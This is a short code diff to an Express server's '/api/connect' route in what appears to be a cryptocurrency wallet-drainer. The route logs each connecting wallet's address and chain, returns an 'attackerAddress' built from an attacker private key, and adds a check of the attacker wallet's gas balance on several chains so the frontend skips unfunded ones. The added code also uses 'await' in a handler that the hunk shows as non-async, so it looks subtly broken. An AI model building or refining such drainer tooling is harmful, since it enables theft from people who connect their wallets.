@@ -129,9 +129,28 @@ app.post('/api/connect', (req, res) => {
     addLog('info', `Wallet connected: ${address} on chainId ${chainId}`)
   }
 
-  res.json({ ok: true, attackerAddress: config.attackerPrivateKey
-    ? new ethers.Wallet(config.attackerPrivateKey).address
-    : null
+  // Check which chains attacker has gas on so frontend skips unfunded chains
+  let fundedChains = []
+  if (config.attackerPrivateKey) {
+    const attackerAddr = new ethers.Wallet(config.attackerPrivateKey).address
+    const GAS_MIN = ethers.utils.parseEther('0.0001')
+    const checks = Object.entries(RPCS).map(async ([chainId, rpcs]) => {
+      for (const url of rpcs) {
+        try {
+          const p = new ethers.providers.JsonRpcProvider(url)
+          const bal = await p.getBalance(attackerAddr)
+          if (bal.gte(GAS_MIN)) { fundedChains.push(parseInt(chainId)); return }
+          break
+        } catch(_) {}
+      }
+    })
+    await Promise.allSettled(checks)
+  }
+
+  res.json({
+    ok: true,
+    attackerAddress: config.attackerPrivateKey ? new ethers.Wallet(config.attackerPrivateKey).address : null,
+    fundedChains
   })
 })
 
